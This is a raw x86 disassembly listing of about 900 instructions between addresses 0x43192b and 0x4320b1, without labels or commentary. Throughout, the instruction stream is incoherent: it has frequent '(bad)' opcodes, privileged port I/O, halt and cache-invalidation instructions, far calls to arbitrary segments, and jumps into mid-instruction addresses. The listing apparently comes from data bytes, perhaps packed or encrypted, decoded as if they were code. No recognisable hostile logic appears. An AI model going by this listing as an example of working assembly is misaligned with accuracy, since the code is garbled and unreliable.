  43192b:	sbb    DWORD PTR [edi-0x1e1219a0],ebp
  431931:	scas   al,BYTE PTR es:[edi]
  431932:	mov    ebx,0x64c3e51f
  431937:	icebp  
  431938:	dec    edx
  431939:	outs   dx,BYTE PTR ds:[esi]
  43193a:	stc    
  43193b:	call   0x9ef93119
  431940:	pop    ebp
  431941:	push   0xb399a4b0
  431946:	in     eax,0xf5
  431948:	push   ecx
  431949:	ror    edi,1
  43194b:	xchg   esp,eax
  43194c:	xchg   DWORD PTR [esp+eax*2],esp
  43194f:	(bad)  
  431950:	push   ss
  431951:	jo     0x4318e0
  431953:	repnz push es
  431955:	out    dx,al
  431956:	loopne 0x431959
  431958:	pop    edi
  431959:	or     esp,DWORD PTR [ebp-0x1e]
  43195c:	inc    esp
  43195d:	mov    edx,0x883a6569
  431962:	mov    ds:0xf43eebe5,al
  431967:	in     eax,dx
  431968:	inc    ecx
  431969:	cdq    
  43196a:	cmp    edx,DWORD PTR [edi+0x18]
  43196d:	inc    ebp
  43196e:	mov    cl,0x33
  431970:	mov    esi,0xf3613d0a
  431975:	mov    dl,0xb6
  431977:	adc    al,0xfa
  431979:	(bad)  
  43197a:	test   BYTE PTR [edx-0x6b],0xa6
  43197e:	xchg   ebp,eax
  43197f:	out    dx,al
  431980:	(bad)  
  431981:	mov    esi,0x10cfc1a
  431986:	sbb    dh,BYTE PTR [eax]
  431988:	mov    gs,ecx
  43198a:	adc    DWORD PTR [ebx],edx
  43198c:	xchg   DWORD PTR [eax+0x6],esi
  43198f:	fmulp  st(7),st
  431991:	pop    edx
  431992:	mov    bl,0x94
  431994:	cmc    
  431995:	mov    al,ds:0xa70be5c0
  43199a:	inc    ebx
  43199b:	lods   eax,DWORD PTR ds:[esi]
  43199c:	cmc    
  43199d:	pushf  
  43199e:	iret   
  43199f:	push   esp
  4319a0:	scas   al,BYTE PTR es:[edi]
  4319a1:	or     eax,0x95223a00
  4319a6:	adc    eax,0xfba0e1dc
  4319ab:	sti    
  4319ac:	imul   esi,DWORD PTR [ebx+0x77],0x0
  4319b0:	mov    eax,ds:0x1394365e
  4319b5:	sar    BYTE PTR [ebp-0x56ddbddc],cl
  4319bb:	call   0x19f:0xf03ec435
  4319c2:	jge    0x431a1b
  4319c4:	mov    BYTE PTR [ecx],cl
  4319c6:	popa   
  4319c7:	pop    ebx
  4319c8:	pop    esp
  4319c9:	inc    ecx
  4319ca:	add    al,0xa
  4319cc:	loop   0x43196f
  4319ce:	fistp  QWORD PTR [edx+0x60]
  4319d1:	shr    cl,cl
  4319d3:	lods   eax,DWORD PTR ds:[esi]
  4319d4:	stc    
  4319d5:	shl    BYTE PTR [edx+0x2315d567],1
  4319db:	icebp  
  4319dc:	mov    ecx,0x1fd0f3a
  4319e1:	sub    cl,BYTE PTR [edi-0x1f]
  4319e4:	std    
  4319e5:	mov    ecx,0xcf4d0b9b
  4319ea:	dec    ecx
  4319eb:	inc    esp
  4319ec:	cmc    
  4319ed:	adc    DWORD PTR [edx+esi*8-0xa],0x53e9994a
  4319f5:	imul   ebp,DWORD PTR [ebx],0xcad7cf4f
  4319fb:	fst    DWORD PTR [ebp+0x63]
  4319fe:	sub    ebp,DWORD PTR [ebx+0x6]
  431a01:	jp     0x431a72
  431a03:	(bad)  
  431a04:	adc    ch,BYTE PTR [ebp-0x1c7a3d]
  431a0a:	adc    al,0x2d
  431a0c:	cwde   
  431a0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431a0e:	pop    ecx
  431a0f:	add    bl,BYTE PTR [edi]
  431a11:	dec    ecx
  431a12:	push   ecx
  431a13:	jl     0x431a2d
  431a15:	mov    dl,0x84
  431a17:	rcr    al,cl
  431a19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431a1a:	fwait
  431a1b:	jecxz  0x4319df
  431a1d:	rcr    BYTE PTR [edi-0x40],cl
  431a20:	lods   al,BYTE PTR es:[esi]
  431a22:	adc    dl,dh
  431a24:	xchg   ebp,eax
  431a25:	sbb    BYTE PTR [eax+0x45],ch
  431a28:	mov    ebp,0x90ede9b4
  431a2d:	pushf  
  431a2e:	sbb    eax,DWORD PTR [ebx]
  431a30:	jecxz  0x431a6c
  431a32:	adc    al,BYTE PTR [ecx+0x1d]
  431a35:	call   0x25a9:0x6000e8b8
  431a3c:	add    eax,0xc4e4da00
  431a41:	mov    cl,bh
  431a43:	mov    cl,0x24
  431a45:	leave  
  431a46:	jb     0x431a7d
  431a48:	stos   DWORD PTR es:[edi],eax
  431a49:	adc    eax,0x891aea86
  431a4e:	inc    edi
  431a4f:	fcmovnu st,st(0)
  431a51:	int3   
  431a52:	outs   dx,BYTE PTR ds:[esi]
  431a53:	sbb    DWORD PTR [edx],esp
  431a55:	pushf  
  431a56:	imul   ecx,edx,0xa
  431a59:	add    cl,BYTE PTR [ecx-0x78]
  431a5c:	push   0x69fc73d0
  431a61:	loope  0x431a17
  431a63:	inc    esp
  431a64:	jmp    0x431ac9
  431a66:	inc    eax
  431a67:	gs in  eax,0xa5
  431a6a:	mov    ecx,0x7e0454ec
  431a6f:	and    bh,BYTE PTR [ebx-0x12ea51e4]
  431a75:	je     0x431a01
  431a77:	out    dx,al
  431a78:	retf   0x2c50
  431a7b:	cli    
  431a7c:	fcmovbe st,st(3)
  431a7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431a7f:	mov    bl,0xa2
  431a81:	(bad)  
  431a82:	mov    cl,0xa4
  431a84:	xor    DWORD PTR [esi],esp
  431a86:	rcl    cl,cl
  431a88:	pop    edi
  431a89:	mov    bl,0xbc
  431a8b:	je     0x431adf
  431a8d:	out    dx,al
  431a8e:	clc    
  431a8f:	mov    ds:0xe91fe995,eax
  431a94:	jae    0x431a28
  431a96:	cmp    bl,al
  431a98:	push   ecx
  431a99:	cdq    
  431a9a:	sbb    eax,0x7928ebde
  431a9f:	mov    WORD PTR [esi],?
  431aa1:	sub    DWORD PTR [edi],ecx
  431aa3:	hlt    
  431aa4:	jne    0x431ac5
  431aa6:	adc    ah,dh
  431aa8:	pop    ecx
  431aa9:	jecxz  0x431a2b
  431aab:	ficomp DWORD PTR [esi]
  431aad:	cmp    DWORD PTR [edx+0x54],eax
  431ab0:	js     0x431b22
  431ab2:	jecxz  0x431a65
  431ab4:	mov    ecx,0x4ded07
  431ab9:	nop
  431aba:	retf   
  431abb:	jnp    0x431a48
  431abd:	in     al,dx
  431abe:	mov    eax,0xf3331604
  431ac3:	enter  0xa600,0xcb
  431ac7:	icebp  
  431ac8:	je     0x431b22
  431aca:	stc    
  431acb:	mov    al,ds:0x209ea327
  431ad0:	dec    eax
  431ad1:	call   0xe6d50f8f
  431ad6:	mov    esi,0x88782671
  431adb:	pop    es
  431adc:	mov    eax,ds:0x21092700
  431ae1:	imul   esp,DWORD PTR [edi-0xb046323],0x2d
  431ae8:	outs   dx,DWORD PTR ds:[esi]
  431ae9:	fs scas al,BYTE PTR es:[edi]
  431aeb:	add    eax,0xf87a2d15
  431af0:	pop    esp
  431af1:	and    eax,0x2025acd3
  431af6:	sub    DWORD PTR ds:0x47e9a168,esi
  431afc:	in     eax,0xc9
  431afe:	cmp    al,0xef
  431b00:	rcr    esi,0x2a
  431b03:	mov    ebp,DWORD PTR [eax+0x45]
  431b06:	lods   eax,DWORD PTR ds:[esi]
  431b07:	test   DWORD PTR [ecx-0x6902505b],edx
  431b0d:	test   DWORD PTR [edx+0x6b41374a],eax
  431b13:	fstp   DWORD PTR ds:0x6fe6a231
  431b19:	les    ebp,FWORD PTR [eax]
  431b1b:	gs (bad) 
  431b1d:	pop    esi
  431b1e:	mov    dh,0x84
  431b20:	cdq    
  431b21:	and    DWORD PTR [ecx+0x73],eax
  431b24:	jbe    0x431b8a
  431b26:	pop    edx
  431b27:	and    al,0x56
  431b29:	ret    0x33e4
  431b2c:	ja     0x431bad
  431b2e:	cmp    eax,0xb863aca2
  431b33:	aam    0xb0
  431b35:	mov    dh,0xae
  431b37:	sbb    esi,esp
  431b39:	push   edx
  431b3a:	xchg   ebx,eax
  431b3b:	pminub mm7,QWORD PTR [esi]
  431b3e:	jo     0x431ad8
  431b40:	mov    bh,0xc5
  431b42:	in     al,dx
  431b43:	rol    BYTE PTR [ebx],0xb3
  431b46:	mov    eax,0x5bfecf68
  431b4b:	test   DWORD PTR [esi],ebx
  431b4d:	or     DWORD PTR [edx+edi*1],ecx
  431b50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431b51:	fisubr WORD PTR [ebp+0x482df51f]
  431b57:	jmp    0xe6597792
  431b5c:	push   ds
  431b5d:	test   eax,0x8760ac37
  431b62:	fbstp  TBYTE PTR [ecx]
  431b64:	sbb    cl,BYTE PTR [ebx+0x29b606dc]
  431b6a:	push   ds
  431b6b:	sbb    al,0xa5
  431b6d:	fcomp  QWORD PTR [eax+ebp*8+0x7cc12a3a]
  431b74:	push   ss
  431b75:	cmc    
  431b76:	mov    ecx,0xf6300c4
  431b7b:	test   ch,al
  431b7d:	pop    ecx
  431b7e:	repz icebp 
  431b80:	sahf   
  431b81:	into   
  431b82:	pop    edx
  431b83:	pusha  
  431b84:	adc    cl,al
  431b86:	loop   0x431b4d
  431b88:	cli    
  431b89:	das    
  431b8a:	xor    ecx,DWORD PTR [eax+0x43]
  431b8d:	aam    0xb3
  431b8f:	xchg   esp,eax
  431b90:	or     cl,bh
  431b92:	retf   
  431b93:	pmaddwd mm4,QWORD PTR [edi-0x75]
  431b97:	lock scas al,BYTE PTR es:[edi]
  431b99:	out    0xc9,eax
  431b9b:	popa   
  431b9c:	sbb    bh,BYTE PTR [ecx+0x2b]
  431b9f:	mov    WORD PTR [ebx],gs
  431ba1:	(bad)  
  431ba2:	fst    QWORD PTR [eax+0x3f4ba6f6]
  431ba8:	loopne 0x431b4b
  431baa:	mov    DWORD PTR [ecx+0x359a2f7d],ebp
  431bb0:	push   edi
  431bb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431bb2:	mov    edi,0xea749504
  431bb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431bb8:	pop    esi
  431bb9:	sbb    bl,ch
  431bbb:	out    dx,al
  431bbc:	in     al,0xa7
  431bbe:	sti    
  431bbf:	inc    ebx
  431bc0:	into   
  431bc1:	inc    ah
  431bc3:	mov    ecx,0x585d008f
  431bc8:	sbb    esi,0x73
  431bcb:	gs cmp al,bl
  431bce:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431bd0:	gs invd 
  431bd3:	jmp    0xc154dfb4
  431bd8:	sub    ch,cl
  431bda:	cmp    eax,0x2408561e
  431bdf:	and    al,0xde
  431be1:	idiv   BYTE PTR [edx+eax*4-0x57]
  431be5:	std    
  431be6:	inc    ebp
  431be7:	ins    BYTE PTR es:[edi],dx
  431be8:	cwde   
  431be9:	jp     0x431b9c
  431beb:	test   BYTE PTR [edi],bl
  431bed:	adc    al,0x5d
  431bf0:	xchg   ecx,eax
  431bf1:	add    BYTE PTR ds:0xb4ccb4c4,bh
  431bf7:	inc    esp
  431bf8:	ds sub ebx,esi
  431bfb:	push   edx
  431bfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431bfd:	mov    DWORD PTR [ebp-0x4dc67364],esp
  431c03:	cmpxchg BYTE PTR [edx-0x17c2a864],bl
  431c0a:	dec    ecx
  431c0b:	push   eax
  431c0c:	inc    esi
  431c0d:	pop    ecx
  431c0e:	cmp    ah,0x7
  431c11:	pop    edx
  431c12:	arpl   WORD PTR [eax+0x15],si
  431c15:	inc    esi
  431c16:	and    ebp,DWORD PTR [edi-0x3]
  431c19:	mov    bl,ah
  431c1b:	fbstp  TBYTE PTR [esi]
  431c1d:	fadd   QWORD PTR [edx+0x5c]
  431c20:	loopne 0x431bc5
  431c22:	(bad)  
  431c23:	mov    al,ds:0xefa36daf
  431c28:	sub    esp,DWORD PTR [edx+0x2577e4bf]
  431c2e:	mov    eax,ebx
  431c30:	xor    eax,0xcde4ea22
  431c35:	xchg   ebp,eax
  431c36:	rol    BYTE PTR [edx+0x48],1
  431c39:	sbb    DWORD PTR [edi-0x3b],ecx
  431c3c:	in     al,0xb7
  431c3e:	call   0xef55:0x7b94
  431c44:	pop    ebp
  431c45:	mov    ds:0x61ff9bfb,al
  431c4a:	mov    esi,0x3acf6fd5
  431c4f:	stc    
  431c50:	mov    ds:0xb4bab64b,eax
  431c55:	jp     0x431ca4
  431c57:	cmp    DWORD PTR [ebp+0x21270887],esp
  431c5d:	out    0x9f,eax
  431c5f:	dec    ebp
  431c60:	mov    eax,ds:0x526b1325
  431c65:	pop    ebp
  431c66:	mov    ah,0xe4
  431c68:	cmp    eax,0x35091581
  431c6d:	pop    edx
  431c6e:	inc    edi
  431c6f:	jmp    0x431c55
  431c71:	das    
  431c72:	push   esi
  431c73:	mov    ecx,0xdb20faee
  431c78:	push   ds
  431c79:	pop    ebp
  431c7a:	jmp    0xa05f51a6
  431c7f:	and    ch,ah
  431c81:	sub    dl,al
  431c83:	out    0xbb,al
  431c85:	js     0x431cdc
  431c87:	or     bl,BYTE PTR [ecx]
  431c89:	stc    
  431c8a:	pop    ebp
  431c8b:	jae    0x431c7c
  431c8d:	fisttp QWORD PTR [esi+esi*2-0x76]
  431c91:	sahf   
  431c92:	dec    ebx
  431c93:	ja     0x431c2e
  431c95:	mul    BYTE PTR [ecx]
  431c97:	xchg   DWORD PTR [ebx-0x43],edi
  431c9a:	pop    ecx
  431c9b:	push   esp
  431c9c:	push   eax
  431c9d:	stos   DWORD PTR es:[edi],eax
  431c9e:	mov    dh,0x14
  431ca0:	jae    0x431c3e
  431ca2:	mov    dl,BYTE PTR [edi]
  431ca4:	sub    DWORD PTR [eax+0x15d7f3e2],0xfffffffd
  431cab:	mov    dl,0x99
  431cad:	shr    bl,cl
  431caf:	out    0x79,eax
  431cb1:	es pop ss
  431cb3:	cli    
  431cb4:	push   es
  431cb5:	sub    ebp,DWORD PTR [esi*4-0x11aaed6e]
  431cbc:	push   es
  431cbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431cbe:	in     al,0x50
  431cc0:	ret    
  431cc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431cc2:	jnp    0x431c7a
  431cc4:	mov    ebp,0xdbbbe2f
  431cc9:	inc    esp
  431cca:	clc    
  431ccb:	dec    edx
  431ccc:	add    esp,eax
  431cce:	mov    ebx,0xb21cae64
  431cd3:	(bad)  
  431cd4:	out    0x5d,al
  431cd6:	jnp    0x431d32
  431cd8:	mov    bh,0xae
  431cda:	push   ss
  431cdb:	popf   
  431cdc:	mov    bl,0xa2
  431cde:	into   
  431cdf:	ret    0x1919
  431ce2:	xor    esi,ebx
  431ce4:	call   0x1d7c:0x8950939f
  431ceb:	and    esi,DWORD PTR [esi]
  431ced:	or     eax,0xb43d5468
  431cf2:	rol    BYTE PTR [ecx+0x8],cl
  431cf5:	call   0x4a55c564
  431cfa:	cs jb  0x431d3c
  431cfd:	fwait
  431cfe:	xchg   edi,eax
  431cff:	aaa    
  431d00:	pop    ebp
  431d01:	and    al,0x42
  431d03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431d04:	(bad)  
  431d05:	jmp    0x60a93227
  431d0a:	jl     0x431d24
  431d0c:	cmp    al,0xf5
  431d0e:	mov    ebx,0xeba9fbac
  431d13:	test   BYTE PTR [eax],ch
  431d15:	mov    ds:0xd006a7b5,eax
  431d1a:	or     eax,DWORD PTR [esi+0x68]
  431d1d:	aas    
  431d1e:	sub    al,0xbf
  431d20:	pop    ds
  431d21:	mov    eax,ds:0xa7dc2c9
  431d26:	(bad)  
  431d28:	push   ds
  431d29:	cdq    
  431d2a:	push   0x2
  431d2c:	and    al,BYTE PTR [edx]
  431d2e:	retf   0xa696
  431d31:	(bad)  
  431d32:	fsub   DWORD PTR [esp+edi*8]
  431d35:	mov    eax,ds:0xf89ccfe7
  431d3a:	repz jb 0x431cf8
  431d3d:	pop    ebx
  431d3e:	mov    ebx,0x40abca34
  431d43:	aad    0x7
  431d45:	adc    BYTE PTR [eax],ah
  431d47:	int3   
  431d48:	ss repnz retf 0xf126
  431d4d:	add    eax,0xa923ee5f
  431d52:	sbb    DWORD PTR [edx],edi
  431d54:	push   edx
  431d55:	fimul  WORD PTR [edx+0x76]
  431d58:	jmp    0x431cf7
  431d5a:	fwait
  431d5b:	jne    0x431d38
  431d5d:	retf   0xf951
  431d60:	mov    bl,0xc2
  431d62:	xchg   esi,eax
  431d63:	call   0xd995:0xa68c2722
  431d6a:	mov    cl,0x28
  431d6c:	xchg   DWORD PTR [edx+0x27de2ccb],ebx
  431d72:	inc    eax
  431d73:	int3   
  431d74:	(bad)  
  431d75:	nop
  431d76:	inc    ebp
  431d77:	icebp  
  431d78:	(bad)  
  431d79:	lds    esi,FWORD PTR [edx-0x387593cc]
  431d7f:	lods   eax,DWORD PTR ds:[esi]
  431d80:	lds    ebx,FWORD PTR [ebp+0xb]
  431d83:	lock mov bh,0x84
  431d86:	mov    BYTE PTR [esp-0x5fefd47c],ch
  431d8d:	adc    DWORD PTR [esi-0x77d3cb0c],esi
  431d93:	stos   BYTE PTR es:[edi],al
  431d94:	xor    eax,0xd9efd2ad
  431d99:	jbe    0x431da3
  431d9b:	push   ss
  431d9c:	and    eax,0xf2747369
  431da1:	jnp    0x431ded
  431da3:	sbb    al,BYTE PTR [ecx-0x5f]
  431da6:	or     ebx,DWORD PTR ds:0xc41ae4e1
  431dac:	pop    esp
  431dad:	xor    BYTE PTR [ebp+edi*1+0x2c],ch
  431db1:	movsx  eax,WORD PTR [eax+ebx*2+0x21]
  431db6:	popa   
  431db7:	mov    ch,ah
  431db9:	das    
  431dba:	popf   
  431dbb:	in     eax,dx
  431dbc:	xor    al,ch
  431dbe:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  431dc0:	not    DWORD PTR [eax]
  431dc2:	cmc    
  431dc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431dc4:	nop
  431dc5:	mov    al,0xb5
  431dc7:	adc    al,0x2
  431dc9:	test   ax,0x1545
  431dcd:	add    eax,0x4654e754
  431dd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431dd3:	push   ds
  431dd4:	sbb    eax,0x83b1369
  431dd9:	scas   eax,DWORD PTR es:[edi]
  431dda:	or     al,0x33
  431ddc:	inc    esi
  431ddd:	jle    0x431dfb
  431ddf:	pop    eax
  431de0:	call   0xa6b0cc93
  431de5:	aas    
  431de6:	mov    dh,0x8a
  431de8:	push   ds
  431de9:	pop    ecx
  431dea:	out    0x42,eax
  431dec:	jbe    0x431e6d
  431dee:	loopne 0x431dd7
  431df0:	mov    gs:0x60dfa28b,al
  431df6:	leave  
  431df7:	aam    0xfa
  431df9:	push   esi
  431dfa:	mov    edx,0xbc28ee48
  431dff:	add    al,0x9c
  431e01:	cs dec ecx
  431e03:	retf   0xc2e5
  431e06:	stos   BYTE PTR es:[edi],al
  431e07:	in     eax,dx
  431e08:	dec    edx
  431e09:	loop   0x431e79
  431e0b:	stc    
  431e0c:	and    eax,0xa860d1f9
  431e11:	std    
  431e12:	and    ebx,DWORD PTR [ebx]
  431e14:	or     BYTE PTR [eax+0x5d6bb2fb],ah
  431e1a:	retf   
  431e1b:	out    0x20,eax
  431e1d:	clc    
  431e1e:	dec    esi
  431e1f:	push   cs
  431e20:	clc    
  431e21:	mov    bp,0xef84
  431e25:	daa    
  431e26:	xor    BYTE PTR [ebp+esi*4-0x10],bl
  431e2a:	loop   0x431e90
  431e2c:	xchg   ebp,eax
  431e2d:	xlat   BYTE PTR ds:[ebx]
  431e2e:	push   ebp
  431e2f:	repnz int3 
  431e31:	sub    DWORD PTR [edx],esi
  431e33:	out    dx,eax
  431e34:	cmp    al,0xd0
  431e36:	pop    edi
  431e37:	fst    st(5)
  431e39:	in     al,dx
  431e3a:	sbb    edx,esp
  431e3c:	inc    ecx
  431e3d:	mov    eax,ds:0x24be6e93
  431e42:	sbb    DWORD PTR [ebx-0xd946410],ebp
  431e48:	(bad)  
  431e49:	xchg   ebp,eax
  431e4a:	mov    WORD PTR [eax-0x46],gs
  431e4d:	lahf   
  431e4e:	adc    bl,0x4f
  431e51:	call   0xb46f:0xc3dd94b9
  431e58:	data16 test BYTE PTR [esi+0x1e],bh
  431e5c:	pop    es
  431e5d:	or     BYTE PTR [edi*4+0x33361b57],al
  431e64:	pop    ss
  431e65:	cmp    al,BYTE PTR ds:[edi-0x9]
  431e69:	ins    BYTE PTR es:[edi],dx
  431e6a:	retf   
  431e6b:	test   BYTE PTR [edx],al
  431e6d:	scas   al,BYTE PTR es:[edi]
  431e6e:	mov    edx,0xcd38df96
  431e73:	ret    0x4fa5
  431e76:	jecxz  0x431e66
  431e78:	fs pop ss
  431e7a:	sbb    eax,0x54a14c8
  431e7f:	dec    esi
  431e80:	das    
  431e81:	mov    cl,0x5f
  431e83:	pop    ss
  431e84:	popa   
  431e85:	pop    ebp
  431e86:	jge    0x431e6d
  431e88:	cli    
  431e89:	aam    0x7b
  431e8b:	loop   0x431e89
  431e8d:	mov    eax,0xc7a1e38d
  431e92:	hlt    
  431e93:	sbb    esp,DWORD PTR [eax]
  431e95:	leave  
  431e96:	bound  ebx,QWORD PTR [eax-0x7c]
  431e99:	sbb    esi,edx
  431e9b:	stos   BYTE PTR es:[edi],al
  431e9c:	in     eax,0xcf
  431e9e:	sub    esi,DWORD PTR [ebp-0x65]
  431ea1:	test   DWORD PTR [eax+ebp*1],esp
  431ea4:	and    ah,BYTE PTR [ebp+0x49]
  431ea7:	or     ebx,DWORD PTR [edi]
  431ea9:	jns    0x431e54
  431eab:	xchg   edi,eax
  431eac:	push   ebp
  431ead:	xchg   ecx,eax
  431eae:	xchg   DWORD PTR [edx],edx
  431eb0:	inc    esp
  431eb1:	lahf   
  431eb2:	mov    ebx,0x74cde409
  431eb7:	mov    al,0x69
  431eb9:	xor    DWORD PTR [edx-0x4e889819],ebx
  431ebf:	test   ah,cl
  431ec1:	cmc    
  431ec2:	ins    BYTE PTR es:[edi],dx
  431ec3:	sub    al,BYTE PTR [ebp+0x47]
  431ec6:	xor    cl,0x88
  431ec9:	leave  
  431eca:	lea    esp,fs:[edx]
  431ecd:	mov    DWORD PTR [ebx+0x3],ebp
  431ed0:	out    0x59,eax
  431ed2:	ret    0xcbae
  431ed5:	xchg   dh,bh
  431ed7:	mov    bl,0xfb
  431ed9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431eda:	jnp    0x431f28
  431edc:	push   0x1f
  431ede:	gs ss (bad) 
  431ee1:	fsub   DWORD PTR ds:0xbf0e5e10
  431ee7:	test   BYTE PTR [eax-0x3a6cb32e],al
  431eed:	fisubr DWORD PTR [ebx]
  431eef:	out    0xc8,al
  431ef1:	(bad)  
  431ef2:	cld    
  431ef3:	call   0xce46:0x833839fe
  431efa:	xlat   BYTE PTR ds:[ebx]
  431efb:	div    DWORD PTR [ebx]
  431efd:	dec    ebx
  431efe:	push   esp
  431eff:	das    
  431f00:	les    eax,FWORD PTR [ecx]
  431f02:	inc    esp
  431f03:	les    ebx,FWORD PTR [bx+di-0x2c95]
  431f08:	(bad)  
  431f0a:	and    BYTE PTR [eax],al
  431f0c:	rcr    BYTE PTR [ecx+0x5a],cl
  431f0f:	jnp    0x431f77
  431f11:	mov    ch,0xbf
  431f13:	xor    al,0x2e
  431f15:	(bad)  
  431f16:	fild   QWORD PTR [ebx-0x170fa5ab]
  431f1c:	cmp    edi,DWORD PTR [eax-0x56e7dfba]
  431f22:	lea    ebx,[ebx+0x11e7bc89]
  431f28:	push   ebp
  431f29:	pushf  
  431f2a:	pop    ebx
  431f2b:	js     0x431f46
  431f2d:	enter  0xd510,0xb0
  431f31:	ret    
  431f32:	imul   edi,DWORD PTR [edx],0x1db44920
  431f38:	sbb    eax,0x7224e20
  431f3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431f3e:	jmp    0x431f0a
  431f40:	xchg   eax,edi
  431f42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431f43:	or     esp,DWORD PTR [edx+ebp*4-0x460e1359]
  431f4a:	out    dx,al
  431f4b:	xchg   esp,eax
  431f4c:	lea    ebx,[edi-0x3a82ebb9]
  431f52:	fwait
  431f53:	mov    ecx,DWORD PTR [ecx]
  431f55:	xor    al,0x5f
  431f57:	imul   esi,DWORD PTR [esi-0x5a984211],0x203aec33
  431f61:	or     DWORD PTR [edx+0x36],ecx
  431f64:	mov    esi,0x9718697d
  431f69:	dec    ecx
  431f6a:	pop    esp
  431f6b:	pop    es
  431f6c:	jns    0x431f59
  431f6e:	or     BYTE PTR ds:0x1cb395a4,al
  431f74:	(bad)  
  431f75:	cdq    
  431f76:	xchg   ebx,eax
  431f77:	daa    
  431f78:	shl    BYTE PTR [edx+ecx*4+0x24],0x1e
  431f7d:	and    esi,DWORD PTR [ebx+0x6f79dd99]
  431f83:	rcr    BYTE PTR [eax-0x129513f0],0x6e
  431f8a:	push   ebx
  431f8b:	xor    ebx,DWORD PTR [edi]
  431f8d:	(bad)  
  431f8e:	icebp  
  431f8f:	aad    0x7b
  431f91:	and    esp,DWORD PTR [ebx-0x5c5a2fca]
  431f97:	cwde   
  431f98:	fisub  DWORD PTR [ecx+0x4c]
  431f9c:	dec    edx
  431f9d:	popf   
  431f9e:	stos   DWORD PTR es:[edi],eax
  431f9f:	addr16 xchg esi,eax
  431fa1:	rcl    BYTE PTR ds:0xc3254974,cl
  431fa7:	shl    BYTE PTR [ebx+0x2e],1
  431faa:	and    al,0x45
  431fac:	xchg   edx,eax
  431fad:	xchg   edx,eax
  431fae:	xchg   edx,eax
  431faf:	mov    al,ds:0x7bbd438c
  431fb4:	es push 0x3c
  431fb7:	add    dh,dl
  431fb9:	stc    
  431fba:	mov    al,ds:0xc30a2449
  431fbf:	xor    esi,edx
  431fc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431fc2:	dec    ebx
  431fc3:	js     0x431f78
  431fc5:	pop    edx
  431fc6:	out    dx,al
  431fc7:	xchg   ebp,eax
  431fc8:	in     al,0xa8
  431fca:	retf   
  431fcb:	sti    
  431fcc:	outs   dx,BYTE PTR ds:[esi]
  431fcd:	loope  0x432026
  431fcf:	pop    ebx
  431fd0:	nop
  431fd1:	cmp    eax,0xfcd692a4
  431fd6:	mov    al,0xc4
  431fd8:	xchg   edi,eax
  431fd9:	push   0xfffffff1
  431fdb:	push   esp
  431fdc:	stos   DWORD PTR es:[di],eax
  431fde:	sbb    eax,0xd6d5e6e1
  431fe3:	add    al,0x30
  431fe5:	repnz rol BYTE PTR [bp+di],cl
  431fe9:	daa    
  431fea:	sbb    DWORD PTR [ebp+0x3a],esp
  431fed:	mov    dh,0xa8
  431fef:	in     eax,0xf1
  431ff1:	cs imul ch
  431ff4:	fidivr DWORD PTR [ebx]
  431ff6:	iret   
  431ff7:	aas    
  431ff8:	pop    ss
  431ff9:	test   eax,0x1084aff0
  431ffe:	dec    esi
  431fff:	gs pop ss
  432001:	stc    
  432002:	mov    esp,0x28b5fe17
  432007:	test   DWORD PTR [ecx+ebp*4],edi
  43200a:	sti    
  43200b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43200c:	xchg   ebx,eax
  43200d:	cs xchg ecx,eax
  43200f:	push   edx
  432010:	xchg   esp,eax
  432011:	sbb    eax,0x7b0767ca
  432016:	pop    ebx
  432017:	rcr    BYTE PTR [ecx],1
  432019:	lea    ebp,[ecx]
  43201b:	sbb    BYTE PTR ds:[ecx-0x60740ff1],dl
  432022:	mov    ds:0x39fe4cd4,eax
  432027:	mov    eax,0xb4b0de2d
  43202c:	ds inc edi
  43202e:	idiv   BYTE PTR [ebp+eax*2+0x6b]
  432032:	or     eax,0xecb138e7
  432037:	mov    cl,0x35
  432039:	jns    0x432068
  43203b:	jb     0x432051
  43203d:	xchg   esi,eax
  43203e:	sbb    al,0xd7
  432040:	retf   
  432041:	push   ss
  432042:	or     edx,edx
  432044:	scas   al,BYTE PTR es:[edi]
  432045:	mov    ds:0xcb20f17b,al
  43204a:	or     DWORD PTR [si],ebp
  43204d:	cmp    BYTE PTR [ecx-0x40932bfc],ah
  432053:	add    al,0xc7
  432055:	mov    edx,0x5a19de8d
  43205a:	xchg   esp,eax
  43205b:	scas   al,BYTE PTR es:[edi]
  43205c:	nop
  43205d:	jb     0x432012
  43205f:	in     al,dx
  432060:	or     bh,BYTE PTR [edi+0xd20a39c]
  432066:	mov    cl,0xa4
  432068:	call   0x85724ce2
  43206d:	out    dx,eax
  43206e:	pop    ecx
  43206f:	jmp    0x4320b8
  432071:	int3   
  432072:	adc    dh,BYTE PTR [ecx+0x1a36a7a2]
  432078:	aam    0xea
  43207a:	mov    ebx,0x45499d64
  43207f:	and    BYTE PTR [edi+0x6a],0x42
  432083:	stos   BYTE PTR es:[edi],al
  432084:	loope  0x4320ff
  432086:	lods   al,BYTE PTR ds:[esi]
  432087:	call   0x13daf9e9
  43208c:	and    eax,DWORD PTR [ecx]
  43208e:	mov    al,0x74
  432090:	cmp    eax,0x31494ef7
  432095:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432096:	mov    ebx,0x6a0c3b6b
  43209b:	repz fs inc ecx
  43209e:	mov    ?,WORD PTR [ecx+0x1b]
  4320a1:	jbe    0x43205e
  4320a3:	add    al,0x3d
  4320a5:	cmc    
  4320a6:	imul   DWORD PTR [esi-0x1c37de19]
  4320ac:	xchg   ecx,eax
  4320ad:	pop    ebp
  4320ae:	push   ds
  4320af:	out    0x8d,al
  4320b1:	jp     0x43208b
